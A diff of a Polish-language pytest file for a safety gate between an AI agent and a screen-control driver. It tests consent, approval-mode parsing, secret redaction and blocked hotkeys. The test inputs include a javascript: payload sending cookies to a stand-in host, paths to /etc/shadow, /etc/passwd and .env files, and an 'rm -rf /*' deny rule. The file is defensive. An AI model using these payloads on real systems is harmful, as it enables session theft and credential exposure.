@@ -1,4 +1,5 @@
-"""Ręce na ekranie właściciela (docs/KOMPUTER.md K6, docs/NATYWNIE.md J14, J15): zgoda, bramka, sterownik, CLI.
+"""Ręce na ekranie właściciela (docs/KOMPUTER.md §9, K6; docs/NATYWNIE.md J14, J15): zgoda, bramka, sterownik,
+odczyt configu Hermesa, profil rąk, CLI.
 
 Prawdziwego cua-driver nie uruchamiamy (dotknąłby ekranu): sterownik to atrapa w Pythonie, która zapisuje argumenty
 i otoczenie, mówi „daemon listening on” i kończy się przy końcu stdin, a w trybie `mcp` odpowiada jak serwer MCP.
@@ -11,6 +12,8 @@ import io
 import json
 import os
 import queue
+import random
+import subprocess
 import sys
 import tempfile
 import threading
@@ -23,7 +26,7 @@ from conftest import REPO, WINDOWS
 
 sys.path.insert(0, str(REPO / "komputer"))
 import rece  # noqa: E402
-from rece import aplikacje, bramka, dziennik, procesy, sterownik, zgoda  # noqa: E402
+from rece import aplikacje, bramka, dziennik, konfig, procesy, profil, sterownik, zgoda  # noqa: E402
 
 from jarvo import rece as cli_rece  # noqa: E402
 from jarvo import sciezki  # noqa: E402
@@ -39,6 +42,17 @@ approvals:
   cron_mode: deny
 command_allowlist: []
 """
+# config profilu jarvo-operator po buildzie (model floty, z którego profil rąk bierze swój)
+OPERATOR = """model:
+  provider: openrouter
+  default: anthropic/claude-sonnet-4.6
+timezone: Europe/Warsaw
+approvals:
+  mode: smart
+command_allowlist:
+- cua:click:background
+"""
+KLUCZ = "sk-ant-api03-"                                  # początek klucza: reszta doklejana w testach (validate.py)
 ATRAPA = r'''
 import json, os, sys
 from pathlib import Path
@@ -65,6 +79,11 @@ if argv[:1] == ["mcp"]:
                  "instructions": "atrapa"}
         elif w["method"] == "tools/list":
             r = {"tools": [{"name": n, "inputSchema": {"type": "object"}} for n in narzedzia]}
+        elif w["method"] == "tools/call" and w["params"]["name"] == "get_window_state":
+            r = {"content": [{"type": "text", "text": "okno"}], "isError": False, "structuredContent": {
+                "elements": [{"element_index": 0, "element_token": "s1:0", "role": "AXButton", "label": "Zapisz"},
+                             {"element_index": 1, "element_token": "s1:1", "role": "AXSecureTextField",
+                              "label": "Hasło", "value": "tajne-haslo"}]}}
         elif w["method"] == "tools/call":
             r = {"content": [{"type": "text", "text": "zrobione " + w["params"]["name"] + " sk-ant-api03-" + "A" * 30}],
                  "isError": False, "structuredContent": {"ok": True, "okno": "klucz ghp_" + "b" * 36}}
@@ -104,10 +123,10 @@ class Zegar:
 @pytest.fixture
 def instalacja(tmp_path):
     stan, dane, program = tmp_path / "stan", tmp_path / "dane", tmp_path / "program"
-    for k in (stan, dane / "profiles" / "jarvo-operator", program):
+    for k in (stan, dane / "profiles" / rece.PROFIL, program):
         k.mkdir(parents=True)
     pliki = zgoda.Pliki(stan)
-    (dane / "profiles" / "jarvo-operator" / "config.yaml").write_text(
+    (dane / "profiles" / rece.PROFIL / "config.yaml").write_text(
         PROFIL_OK.format(manifest=str(pliki.manifest).replace("\\", "\\\\")), encoding="utf-8")
     atrapa = tmp_path / "atrapa" / "cua-driver.py"
     atrapa.parent.mkdir()
@@ -121,7 +140,8 @@ def instalacja(tmp_path):
     k = bramka.Kontekst(env=env, pliki=pliki, platforma=PLATFORMA, program_dir=program, dane=dane, teraz=zegar,
                         daj_sterownik=lambda: st, podwyzszone=lambda: False, uzytkownik=UZYTKOWNIK, takt=0.05,
                         bledy=io.StringIO(), rodzic=os.getpid(), zasady=bramka.wczytaj_zasady())
-    return {"k": k, "pliki": pliki, "zegar": zegar, "atrapa": atrapa, "dane": dane, "tmp": tmp_path}
+    return {"k": k, "pliki": pliki, "zegar": zegar, "atrapa": atrapa, "dane": dane, "tmp": tmp_path,
+            "profil": dane / "profiles" / rece.PROFIL / "config.yaml"}
 
 
 def daj_zgode(inst, sekundy: int = 1800, aplikacje_=None) -> zgoda.Zgoda:
@@ -175,7 +195,8 @@ def test_zgoda_podpisana_i_wazna(instalacja):
     w = zgoda.wczytaj(instalacja["pliki"], platforma=PLATFORMA, teraz=instalacja["zegar"](), uzytkownik=UZYTKOWNIK)
     assert w == z and w.nazwy() == ["notatnik"] and 1790 <= w.pozostalo(instalacja["zegar"]()) <= 1800
     dane = json.loads(instalacja["pliki"].zgoda.read_text(encoding="utf-8"))
-    assert len(dane["podpis"]) == 64 and dane["sterownik"] == rece.WERSJA and dane["profil"] == "jarvo-operator"
+    assert len(dane["podpis"]) == 64 and dane["sterownik"] == rece.WERSJA and dane["profil"] == rece.PROFIL == \
+        "jarvo-ekran"
     assert bytes.fromhex(instalacja["pliki"].klucz.read_text(encoding="ascii").strip()).__len__() == 32
 
 
@@ -321,6 +342,204 @@ def test_stale_zgody_i_approvals_off():
     assert not bramka.zgody_wylaczone("approvals:\n  mode: manual\ntts:\n  mode: off\n")
 
 
+def _kody(tekst: str, **kw) -> list[str]:
+    return [o.kod for o in bramka.problemy_profilu(tekst, **kw)]
+
+
+@pytest.mark.parametrize("tekst, kod", [
+    # YAML 1.1: gołe false, no, off, Off, OFF to fałsz, a dla Hermesa approvals.mode off (przepuszcza wszystko)
+    ("approvals:\n  mode: false\n", "zgody_wylaczone"),
+    ("approvals:\n  mode: no\n", "zgody_wylaczone"),
+    ("approvals:\n  mode: Off\n", "zgody_wylaczone"),
+    ("approvals:\n  mode: oFF\n", "zgody_wylaczone"),           # nie bool w PyYAML, ale napis „off” po lower()
+    ("approvals:\n  mode: ' OFF '\n", "zgody_wylaczone"),
+    ("approvals:\n  mode: smart\n", "zgody_nie_reczne"),
+    ("approvals:\n  timeout: 300\n", "zgody_nie_reczne"),        # brak mode: domyślny smart z config_defaults.py
+    ("model:\n  default: x\n", "zgody_nie_reczne"),
+    ("approvals:\n", "zgody_nie_reczne"),                       # approvals: null nie nadpisuje domyślnych
+    ("approvals:\n  mode: auto\n", "zgody_nie_reczne"),          # nieznana wartość: Hermes zgadłby manual
+    ("approvals:\n  mode: manual\n  cron_mode: approve\n", "zgody_bez_czlowieka"),
+    ("approvals:\n  mode: manual\n  single_query_mode: approve\n", "zgody_bez_czlowieka"),
+    ("approvals:\n  mode: manual\n  unattended_mode: ALLOW\n", "zgody_bez_czlowieka"),
+    ("approvals:\n  mode: manual\n  cron_mode: 'off'\n", "zgody_bez_czlowieka"),    # napis off = zatwierdza sam
+    ("approvals:\n  mode: manual\n  cron_mode: \"yes\"\n", "zgody_bez_czlowieka"),
+    # czego nie da się przeczytać na pewno
+    ("approvals: {mode: off}\n", "profil_nieczytelny"),
+    ("approvals: {mode: manual}\n", "profil_nieczytelny"),
+    ("approvals:\n  mode: manual\napprovals:\n  mode: off\n", "profil_nieczytelny"),     # powtórzony klucz
+    ("approvals:\n  mode: manual\n  mode: off\n", "profil_nieczytelny"),
+    ("\"approvals\":\n  mode: manual\n", "profil_nieczytelny"),                         # klucz w cudzysłowie
+    ("approvals:\n  'mode': manual\n", "profil_nieczytelny"),
+    ("x: &z\n  mode: off\napprovals: *z\n", "profil_nieczytelny"),                       # kotwica i alias
+    ("approvals:\n  <<: {mode: off}\n  mode: manual\n", "profil_nieczytelny"),            # scalanie
+    ("approvals:\n  mode: !!str manual\n", "profil_nieczytelny"),                        # tag
+    ("? approvals\n: {mode: off}\n", "profil_nieczytelny"),                              # klucz złożony
+    ("approvals:\n  mode: manual\n---\napprovals:\n  mode: off\n", "profil_nieczytelny"),  # drugi dokument
+    ("approvals:\n\tmode: manual\n", "profil_nieczytelny"),                              # tabulator
+    ("approvals:\n  mode: manual\x85approvals: off\n", "profil_nieczytelny"),            # NEL to koniec wiersza
+    ("approvals:\n  mode: ${TRYB}\n", "profil_nieczytelny"),                             # Hermes rozwija zmienną
+    ("approvals:\n  mode: manual\n    off\n", "profil_nieczytelny"),                     # wartość na dwa wiersze
+    ("approvals:\n  mode: \"man\\qual\"\n", "profil_nieczytelny"),                       # zła ucieczka
+    ("approvals:\n  mode: 1\n", "profil_nieczytelny"),
+    ("approvals:\n  mode:\n", "profil_nieczytelny"),
+    ("approvals:\n- mode: manual\n", "profil_nieczytelny"),
+    ("approvals:\n  mode: manual\n  cron_mode: [approve]\n", "profil_nieczytelny"),
+    ("approvals:\n  mode: manual\ncommand_allowlist: \"[ls]\"\n", "profil_nieczytelny"),  # stara postać napisu
+])
+def test_zgody_profilu_jak_czyta_je_hermes(tekst, kod):
+    assert kod in _kody(tekst), (tekst, bramka.problemy_profilu(tekst))
+    assert bramka.zgody_wylaczone(tekst)
+
+
+@pytest.mark.parametrize("tekst", [
+    "approvals:\n  mode: manual\n",
+    "approvals:\n  mode: true\n",                                # prawda = manual (_normalize_approval_mode)
+    "approvals:\n  mode: yes\n",
+    "approvals:\n  mode: \"Manual \"\n",
+    "approvals:\n  mode: manual\n  cron_mode: deny\n  single_query_mode: off\n  unattended_mode: yes\n",  # bool = deny
+    "approvals:\n  mode: manual   # komentarz\n  cron_mode: ~\n  timeout: 300\n  deny:\n  - 'rm -rf /*'\n",
+    "---\n# profil\napprovals:\n  mode: manual\n  smart_policy: >-\n    Always ESCALATE: a: b\n    # nie komentarz\n",
+    "\ufeffapprovals :\n  mode : manual\ncommand_allowlist: []\nplatform_toolsets:\n  cli: [computer_use, todo]\n",
+])
+def test_zgody_profilu_reczne_przechodza(tekst):
+    assert bramka.problemy_profilu(tekst) == [] and not bramka.zgody_wylaczone(tekst)
+
+
+@pytest.mark.parametrize("tekst, zgody", [
+    ("command_allowlist: ['a#b', 'cua:click:background']\n", ["cua:click:background"]),
+    ('command_allowlist: ["ls", "cua:type:foreground"]\n', ["cua:type:foreground"]),
+    ('command_allowlist:\n  - "cua\\x3aclick:background"\n', ["cua:click:background"]),       # ucieczka w YAML
+    ('command_allowlist:\n- "\\u0063ua:key:foreground"\n', ["cua:key:foreground"]),
+    ("command_allowlist:\n- 'cua:drag:\n  background'\n", ["cua:drag:"]),                       # na dwa wiersze
+    ("command_allowlist:\n- CUA:click:background\n", ["CUA:click:background"]),
+    ("command_allowlist: cua:click:background\n", ["cua:click:background"]),                  # stara postać
+])
+def test_stale_zgody_w_kazdej_pisowni(tekst, zgody):
+    assert bramka.stale_zgody(tekst) == zgody
+    assert "stala_zgoda" in _kody(tekst + "approvals:\n  mode: manual\n")
+
+
+def test_stale_zgody_w_pliku_nieczytelnym_tez_widac():
+    tekst = "approvals: &a\n  mode: manual\ncommand_allowlist:\n  - cua:click:background\n"
+    assert _kody(tekst) == ["profil_nieczytelny", "stala_zgoda"]
+    assert bramka.stale_zgody(tekst) == ["cua:click:background"]
+
+
+def test_nakladka_administratora_liczy_tylko_swoje_klucze():
+    assert _kody("model:\n  default: x\n", nakladka=True) == []
+    assert _kody("approvals:\n  cron_mode: approve\n", nakladka=True) == ["zgody_bez_czlowieka"]
+    assert _kody("approvals:\n  mode: smart\n", nakladka=True) == ["zgody_nie_reczne"]
+
+
+def _python_yaml(w):
+    if isinstance(w, konfig.Mapa):
+        return {k: _python_yaml(v) for k, v in w.pola.items()}
+    if isinstance(w, konfig.Lista):
+        return [_python_yaml(e) for e in w.elementy]
+    if w is None:
+        return None
+    rodzaj, x = w.wartosc()
+    return ("INNY", x) if rodzaj == "inny" else x
+
+
+def _zgodne(moje, ich) -> bool:
+    import datetime
+    if isinstance(moje, tuple):
+        return (isinstance(ich, (int, float, datetime.date)) and not isinstance(ich, bool)) or ich is None
+    if isinstance(moje, dict):
+        return isinstance(ich, dict) and len(moje) == len(ich) and all(
+            k in ich and _zgodne(v, ich[k]) for k, v in moje.items() if not _klucz_specjalny(k)) and all(
+            _klucz_specjalny(k) for k in moje if k not in ich)
+    if isinstance(moje, list):
+        return isinstance(ich, list) and len(moje) == len(ich) and all(_zgodne(a, b) for a, b in zip(moje, ich))
+    return moje == ich and type(moje) is type(ich)
+
+
+def _klucz_specjalny(k: str) -> bool:
+    """Klucz, który PyYAML zamienia na liczbę, bool albo None (konfig trzyma go jako napis)."""
+    return konfig.Skalar(k).wartosc()[0] != "str"
+
+
+def _korpus_configow() -> list[str]:
+    yaml = pytest.importorskip("yaml")
+    teksty = [p.read_text(encoding="utf-8") for p in sorted(REPO.glob("profiles/*/config.yaml"))]
+    teksty += [yaml.safe_dump(yaml.safe_load(t), allow_unicode=True, sort_keys=False, width=w)
+               for t in teksty[:6] for w in (40, 100)]
+    teksty.append(profil.tekst_configu(Path("C:/Jan Kowalski/stan/rece/manifest.yaml"),
+                                       {"provider": "openrouter", "default": "anthropic/x"}, "Europe/Warsaw",
+                                       ["jarvo-zgody"]))
+    teksty += ["a: 'x\n  y'\nb: \"p\\\n  q\"\nc: [1, 'z', {d: e}]\n", "k:\n  - a: 1\n    b: [x, y]\n  - - z\n    - w\n",
+               "t: |\n  linia\n\n  druga\n    wcieta\nu: >-\n  jeden\n  dwa\n\n  trzy\n", PROFIL_OK, OPERATOR]
+    return teksty
+
+
+def test_konfig_czyta_to_samo_co_pyyaml():
+    """Configi floty, ich zrzuty PyYAML (jak po buildzie) i przypadki brzegowe: odczyt bramki = PyYAML."""
+    yaml = pytest.importorskip("yaml")
+    for tekst in _korpus_configow():
+        assert _zgodne(_python_yaml(konfig.czytaj(tekst)), yaml.safe_load(tekst)), tekst[:200]
+
+
+def test_konfig_odmawia_zamiast_zgadywac():
+    """Mutacje configów: gdy czytnik bramki coś przyjmuje, PyYAML musi przeczytać dokładnie to samo (inaczej
+    bramka myliłaby się co do zgód); PyYAML z błędem = Hermes bierze ostatnią dobrą kopię, więc czytnik odmawia."""
+    yaml = pytest.importorskip("yaml")
+    korpus = _korpus_configow()
+    znaki = list(":- #'\"[]{},\n|>&*!?\\%@`~=<") + ["  ", "\n  ", "\n- ", ": ", " #", "off", "yes", "1", "\\x3a"]
+    los = random.Random(6)
+    przyjete = 0
+    for _ in range(1500):
+        t = los.choice(korpus)
+        for _ in range(los.randint(1, 3)):
+            i = los.randrange(len(t) + 1)
+            r = los.random()
+            t = t[:i] + los.choice(znaki) + t[i:] if r < 0.45 else t[:i] + t[i + 1:] if r < 0.8 \
+                else t[:i] + los.choice(znaki) + t[i + 1:]
+        try:
+            moje = _python_yaml(konfig.czytaj(t))
+        except konfig.Niepewne:
+            continue
+        przyjete += 1
+        try:
+            ich = yaml.safe_load(t)
+        except yaml.YAMLError as e:
+            pytest.fail(f"czytnik przyjął, a PyYAML odrzuca ({e}): {t!r}")
+        assert _zgodne(moje, ich if ich is not None else {}), t
+    assert przyjete > 300
+
+
+def test_profil_ze_zgodami_w_nakladce_i_w_hermes_home(instalacja, tmp_path):
+    z = daj_zgode(instalacja)
+    k = instalacja["k"]
+    assert bramka.sprawdz_profil(k, z) is None
+    nakladka = tmp_path / "zarzadzane"
+    nakladka.mkdir()
+    (nakladka / "config.yaml").write_text("approvals:\n  unattended_mode: approve\n", encoding="utf-8")
+    k.env["HERMES_MANAGED_DIR"] = str(nakladka)
+    assert bramka.sprawdz_profil(k, z).kod == "zgody_bez_czlowieka"
+    (nakladka / "config.yaml").write_text("display:\n  skin: jarvo\n", encoding="utf-8")
+    assert bramka.sprawdz_profil(k, z) is None
+    del k.env["HERMES_MANAGED_DIR"]
+    dom = tmp_path / "inny-dom"
+    dom.mkdir()
+    (dom / "config.yaml").write_text("approvals:\n  mode: smart\n", encoding="utf-8")
+    k.env["HERMES_HOME"] = str(dom)                                     # Hermes czyta config z HERMES_HOME
+    assert bramka.sprawdz_profil(k, z).kod == "zgody_nie_reczne"
+
+
+def test_tryb_pelny_zamyka_rece(instalacja):
+    daj_zgode(instalacja)
+    k = instalacja["k"]
+    assert not bramka.tryb_pelny({}) and not bramka.tryb_pelny({"HERMES_YOLO_MODE": "0"})
+    assert bramka.tryb_pelny({"HERMES_YOLO_MODE": "1"}) and bramka.tryb_pelny({"HERMES_YOLO_MODE": "cokolwiek"})
+    k.env["HERMES_YOLO_MODE"] = "true"
+    assert bramka.serve(argv_serve(instalacja, gniazdo(instalacja["tmp"])), k) == bramka.KOD_ODMOWY
+    assert wpisy_dziennika(instalacja)[-1]["kod"] == "tryb_pelny"
+    assert bramka.mcp(["--embedded", "--socket", gniazdo(instalacja["tmp"])], k, wejscie=io.BytesIO(b""),
+                      wyjscie=io.BytesIO()) == bramka.KOD_ODMOWY
+    assert not (instalacja["atrapa"].parent / "serve.json").exists()
+
+
 # ---------------------------------------------------------------- bramka: serve
 
 def test_dla_rak():
@@ -398,7 +617,7 @@ def test_serve_odmawia_innego_manifestu_i_gniazda(instalacja, tmp_path):
 def test_serve_odmawia_stalych_zgod_profilu_i_administratora(instalacja):
     daj_zgode(instalacja)
     k = instalacja["k"]
-    plik = instalacja["dane"] / "profiles" / "jarvo-operator" / "config.yaml"
+    plik = instalacja["profil"]
     dobry = plik.read_text(encoding="utf-8")
     plik.write_text(dobry.replace("command_allowlist: []", "command_allowlist:\n  - \"cua:click:foreground\""),
                     encoding="utf-8")
@@ -496,7 +715,7 @@ def test_serve_stop_i_stala_zgoda_w_trakcie(instalacja):
     watek.join(10)
     assert not watek.is_alive() and wpisy_dziennika(instalacja)[-1]["powod"] == "stop"
     watek, _ = uruchom_serve(instalacja, g)
-    plik = instalacja["dane"] / "profiles" / "jarvo-operator" / "config.yaml"
+    plik = instalacja["profil"]
     time.sleep(0.05)
     plik.write_text(plik.read_text(encoding="utf-8").replace("command_allowlist: []",
                                                             "command_allowlist: [\"cua:type:foreground\"]"),
@@ -547,6 +766,16 @@ class Rozmowa:
     def odpowiedz(self, id_, wynik: dict) -> dict:
         self.pompa.od_sterownika(json.dumps({"jsonrpc": "2.0", "id": id_, "result": wynik}).encode())
         return self.do_hermesa[-1]
+
+    def migawka(self, *elementy: dict, pid: int = 4242, okno: int = 7) -> dict:
+        """get_window_state przez bramkę i odpowiedź sterownika z elementami (structuredContent.elements)."""
+        assert self.narzedzie("get_window_state", pid=pid, window_id=okno) is None
+        return self.odpowiedz(self.n, {"content": [{"type": "text", "text": "okno"}], "isError": False,
+                                       "structuredContent": {"elements": list(elementy)}})
+
+
+def el(i: int, rola: str, napis: str, **reszta) -> dict:
+    return {"element_index": i, "element_token": f"s9:{i}", "role": rola, "label": napis, **reszta}
 
 
 def test_mcp_lista_narzedzi_i_instrukcje(instalacja):
@@ -602,6 +831,7 @@ def test_mcp_odmowy(instalacja, nazwa, args, kod):
 ])
 def test_mcp_przepuszcza_dzialania_w_zgodzie(instalacja, nazwa, args):
     r = Rozmowa(instalacja)
+    r.migawka(el(3, "AXButton", "Zapisz"))
     assert r.narzedzie(nazwa, **args) is None
     assert r.do_sterownika[-1]["params"] == {"name": nazwa, "arguments": args}
 
@@ -635,6 +865,239 @@ def test_mcp_ukrywa_sekrety_w_odpowiedziach(instalacja):
     assert "sk-ant" not in json.dumps(r.do_hermesa[-1]) and r.pompa.ukryte == 5
 
 
+def test_ukrywanie_pomija_tylko_obrazy():
+    """Długi tekst, którego początek wygląda jak base64, dalej przechodzi przez ukrywanie (wcześniej wystarczało
+    4096 znaków base64 na początku napisu ponad 64 KB); obraz zostaje bez zmian; klucze i głębokie zagnieżdżenia też."""
+    zasady = bramka.wczytaj_zasady()
+    sekret = KLUCZ + "Q" * 40
+    tekst = "A" * 4096 + " dokument ... klucz " + sekret + " koniec"
+    tekst += "B" * (70000 - len(tekst) - (70000 - len(tekst)) % 4)
+    tekst += "C" * ((-len(tekst)) % 4)
+    for napis in (tekst, "A" * 70000 + "/" + sekret, "iVBORw0KGgo" + "A" * 4000 + " " + sekret):
+        w, n = bramka._ukryj({"value": napis}, zasady)
+        assert n == 1 and sekret not in json.dumps(w)
+    obraz = "iVBORw0KGgo" + "A" * 70001
+    assert bramka._ukryj({"screenshot": obraz}, zasady) == ({"screenshot": obraz}, 0)
+    tekst_w_obrazie = {"type": "image", "data": "to nie obraz " + sekret}
+    assert sekret not in json.dumps(bramka._ukryj(tekst_w_obrazie, zasady)[0])
+    assert sekret not in json.dumps(bramka._ukryj({sekret: 1}, zasady)[0])            # klucz słownika
+    gleboko: object = sekret
+    for _ in range(80):
+        gleboko = [gleboko]
+    assert sekret not in json.dumps(bramka._ukryj({"a": gleboko}, zasady)[0])
+    haslo = {"role": "AXSecureTextField", "value": "Haslo123!"}
+    assert "Haslo123" not in json.dumps(bramka._ukryj(haslo, zasady)[0])
+
+
+def _ocen(nazwa: str, platforma: str = PLATFORMA, aplikacje_=None, **args):
+    z = zgoda.Zgoda(id="x", utworzono=0, wygasa=10 ** 10, bezczynnosc=600, platforma=platforma, uzytkownik="u",
+                    profil=rece.PROFIL, aplikacje=tuple(aplikacje_ or (notatnik(),)), narzedzia=tuple(rece.NARZEDZIA),
+                    manifest_sha256="", sterownik=rece.WERSJA)
+    return bramka.ocen(nazwa, args, z, platforma, bramka.wczytaj_zasady())
+
+
+@pytest.mark.parametrize("args", [
+    {"key": "max_image_dimension", "value": 1456, "capture_scope": "desktop"},
+    {"key": "max_image_dimension", "value": 1456.0},
+    {"key": "max_image_dimension", "value": True},
+    {"key": "capture_scope", "value": "desktop", "session": "s"},
+    {"max_image_dimension": 1456, "capture_scope": "desktop"},
+    {"session": "s"},
+    {"key": "max_image_dimension"},
+])
+def test_set_config_tylko_wymiar_obrazu(args):
+    odmowa = _ocen("set_config", **args)
+    assert odmowa is not None and odmowa.kod == "zablokowane" and odmowa.regula == "konfiguracja", args
+
+
+def test_set_config_dozwolony():
+    assert _ocen("set_config", key="max_image_dimension", value=1456, session="s") is None
+    assert _ocen("set_config", max_image_dimension=1456, session="s") is None
+
+
+@pytest.mark.parametrize("platforma, aplikacja, args, dobrze", [
+    ("windows-x64", None, {"name": "notatnik", "path": r"C:\Users\x\Downloads\notepad.exe"}, False),
+    ("windows-x64", None, {"name": "notatnik", "path": r"C:\Users\x\workspace\notepad.cmd"}, False),
+    ("windows-x64", None, {"name": "notatnik", "launch_path": r"\\serwer\udzial\notepad.exe"}, False),
+    ("windows-x64", None, {"name": "notatnik", "path": r"notepad.exe"}, False),          # ścieżka bez katalogu
+    ("windows-x64", None, {"bundle_id": r"C:\Users\x\notepad.exe"}, False),
+    ("windows-x64", None, {"name": r"C:\Users\x\Downloads\notepad.exe"}, False),        # nazwa jak ścieżka
+    ("windows-x64", None, {"name": "notatnik", "path": r"C:\WINDOWS\system32\NOTEPAD.EXE"}, True),
+    ("windows-x64", None, {"name": "notatnik", "path": "\\\\?\\C:\\Windows\\System32\\notepad.exe"}, True),
+    ("windows-x64", None, {"bundle_id": r"C:\Windows\System32\..\System32\notepad.exe"}, True),
+    ("windows-x64", None, {"name": "notepad"}, True),
+    ("windows-x64", None, {"name": 7}, False),
+    ("windows-x64", None, {"name": "notatnik", "creates_new_application_instance": "tak"}, False),
+    ("windows-x64", None, {"name": "notatnik", "urls": "https://jarvo.pl"}, False),
+    ("windows-x64", None, {"name": "notatnik", "urls": ["https://jarvo.pl\u200b/x"]}, False),
+    ("linux-x64", zgoda.Aplikacja("gedit", {"executable": "/usr/bin/gedit"}),
+     {"name": "gedit", "path": "/home/x/gedit"}, False),
+    ("linux-x64", zgoda.Aplikacja("gedit", {"executable": "/usr/bin/gedit"}),
+     {"name": "gedit", "path": "/usr/bin/../bin/gedit"}, True),
+    ("macos-arm64", zgoda.Aplikacja("TextEdit", {"bundle_id": "com.apple.TextEdit"}),
+     {"name": "TextEdit", "path": "/Applications/TextEdit.app"}, False),
+    ("macos-arm64", zgoda.Aplikacja("TextEdit", {"bundle_id": "com.apple.TextEdit"}),
+     {"bundle_id": "com.apple.Terminal"}, False),
+    ("macos-arm64", zgoda.Aplikacja("TextEdit", {"bundle_id": "com.apple.TextEdit"}),
+     {"bundle_id": "com.apple.textedit"}, True),
+])
+def test_launch_app_tylko_tozsamosc_ze_zgody(platforma, aplikacja, args, dobrze):
+    odmowa = _ocen("launch_app", platforma, [aplikacja] if aplikacja else None, **args)
+    assert (odmowa is None) == dobrze, (args, odmowa)
+
+
+@pytest.mark.parametrize("platforma, args", [
+    # schowek właściciela (kopiuj, wytnij, wklej), także jako jeden napis i z innymi nazwami modyfikatorów
+    (PLATFORMA, {"keys": ["ctrl", "c"]}), (PLATFORMA, {"keys": ["ctrl", "v"]}), (PLATFORMA, {"keys": ["ctrl", "x"]}),
+    (PLATFORMA, {"keys": ["shift", "insert"]}), (PLATFORMA, {"keys": ["ctrl", "insert"]}),
+    (PLATFORMA, {"keys": ["shift", "delete"]}), (PLATFORMA, {"keys": ["Control_L", "V"]}),
+    (PLATFORMA, {"keys": ["ctrl+v"]}), (PLATFORMA, {"key": "ctrl+v"}), (PLATFORMA, {"key": "Ctrl - Shift - V"}),
+    (PLATFORMA, {"key": "v", "modifiers": ["ctrl"]}), (PLATFORMA, {"keys": ["lctrl", "ins"]}),
+    ("macos-arm64", {"keys": ["cmd", "c"]}), ("macos-arm64", {"keys": ["command", "v"]}),
+    ("macos-arm64", {"keys": ["cmd", "x"]}), ("macos-arm64", {"keys": ["cmd", "shift", "v"]}),
+    # zrzut ekranu (cały ekran, schowek)
+    (PLATFORMA, {"key": "PrintScreen"}), (PLATFORMA, {"keys": ["alt", "prtsc"]}),
+    ("macos-arm64", {"keys": ["cmd", "shift", "4"]}), ("macos-arm64", {"keys": ["ctrl", "cmd", "shift", "3"]}),
+    # system: Windows
+    ("windows-x64", {"keys": ["ctrl", "alt", "tab"]}), ("windows-x64", {"keys": ["alt", "esc"]}),
+    ("windows-x64", {"keys": ["alt", "f4"]}), ("windows-x64", {"keys": ["alt", "space"]}),
+    ("windows-x64", {"keys": ["menu", "f4"]}), ("windows-x64", {"keys": ["ctrl", "shift", "esc"]}),
+    ("windows-x64", {"keys": ["win", "r"]}), ("windows-x64", {"key": "lwin"}), ("windows-x64", {"keys": ["cmd", "d"]}),
+    # system: Linux
+    ("linux-x64", {"keys": ["alt", "f1"]}), ("linux-x64", {"keys": ["alt", "space"]}),
+    ("linux-x64", {"keys": ["alt", "f2"]}), ("linux-x64", {"keys": ["ctrl", "alt", "l"]}),
+    ("linux-x64", {"keys": ["ctrl", "alt", "left"]}), ("linux-x64", {"keys": ["ctrl", "alt", "t"]}),
+    ("linux-x64", {"keys": ["ctrl", "q"]}), ("linux-x64", {"keys": ["ctrl", "alt", "f3"]}),
+    ("linux-x64", {"keys": ["super_l"]}), ("linux-x64", {"keys": ["alt_l", "tab"]}),
+    # system: macOS
+    ("macos-arm64", {"keys": ["cmd", "q"]}), ("macos-arm64", {"keys": ["cmd", "option", "h"]}),
+    ("macos-arm64", {"keys": ["ctrl", "up"]}), ("macos-arm64", {"keys": ["ctrl", "right"]}),
+    ("macos-arm64", {"keys": ["fn", "c"]}), ("macos-arm64", {"keys": ["ctrl", "f2"]}),
+    ("macos-arm64", {"keys": ["cmd", "shift", "q"]}), ("macos-arm64", {"keys": ["ctrl", "space"]}),
+    # nie nazwy klawiszy
+    (PLATFORMA, {"keys": ["ctrl", 86]}), (PLATFORMA, {"keys": ["a", "b"]}),
+])
+def test_skroty_schowka_zrzutu_i_systemu(platforma, args):
+    odmowa = _ocen("hotkey" if "keys" in args else "press_key", platforma, **args)
+    assert odmowa is not None and odmowa.kod == "zablokowane", (platforma, args)
+
+
+@pytest.mark.parametrize("platforma, args", [
+    (PLATFORMA, {"keys": ["ctrl", "s"]}), (PLATFORMA, {"keys": ["ctrl", "z"]}), (PLATFORMA, {"keys": ["ctrl", "a"]}),
+    (PLATFORMA, {"keys": ["ctrl", "shift", "z"]}), (PLATFORMA, {"keys": ["ctrl", "f"]}),
+    (PLATFORMA, {"keys": ["ctrl", "w"]}), (PLATFORMA, {"keys": ["alt", "left"]}), (PLATFORMA, {"key": "Return"}),
+    (PLATFORMA, {"key": "ctrl+-"}), (PLATFORMA, {"key": "F5"}), (PLATFORMA, {"key": "delete"}),
+    (PLATFORMA, {"keys": ["shift", "tab"]}), (PLATFORMA, {"key": "ctrl+home"}),
+    ("macos-arm64", {"keys": ["cmd", "s"]}), ("macos-arm64", {"keys": ["cmd", "z"]}),
+    ("macos-arm64", {"keys": ["cmd", "w"]}), ("macos-arm64", {"keys": ["option", "left"]}),
+])
+def test_skroty_aplikacji_przechodza(platforma, args):
+    assert _ocen("hotkey" if "keys" in args else "press_key", platforma, **args) is None, (platforma, args)
+
+
+@pytest.mark.parametrize("tekst", [
+    "javascript:fetch('https://x.example/?c='+document.cookie)", " \x00JaVaScRiPt:alert(1)",
+    "ｊａｖａｓｃｒｉｐｔ：alert(1)", "java\u200bscript:alert(1)", "vbscript:msgbox(1)", "javascript: alert(1)",
+    "file:///C:/Users/owner/.env", "FILE://localhost/etc/passwd", "data:text/html,<script>x()</script>",
+    "chrome://settings/passwords", "about:blank", "view-source:https://bank.pl", "ms-settings:privacy",
+    "shell:startup", "search-ms:query=haslo", "edge://flags", "chrome-extension://abc/x.html",
+    "C:\\Users\\owner\\.env", "\\\\serwer\\udzial\\plik", "zobacz: file:///etc/shadow", "localhost:8080/admin",
+    "mailto:ktos@example.com?body=x", "tel:+48123456789",
+])
+def test_type_text_bez_adresow_i_sciezek(tekst):
+    for nazwa, pole in (("type_text", "text"), ("set_value", "value")):
+        odmowa = _ocen(nazwa, **{"pid": 1, pole: tekst})
+        assert odmowa is not None and odmowa.regula in ("adres", "znak_sterujacy"), (nazwa, tekst, odmowa)
+
+
+@pytest.mark.parametrize("tekst", ["https://jarvo.pl/oferta?x=1", "Data: 25 października 2026", "Uwaga: to tekst",
+                                   "spotkanie o 10:30", "zażółć gęślą jaźń", "x = a * b; y = {'a': 1}",
+                                   "http://localhost:3000"])
+def test_type_text_zwykly_tekst_przechodzi(tekst):
+    assert _ocen("type_text", pid=1, text=tekst) is None
+
+
+@pytest.mark.parametrize("tekst", ["linia\nsend", "linia\r", "a\tb", "\x1b[2J", "a\u2028b", "x\x0bz"])
+def test_type_text_bez_entera_i_tab(tekst):
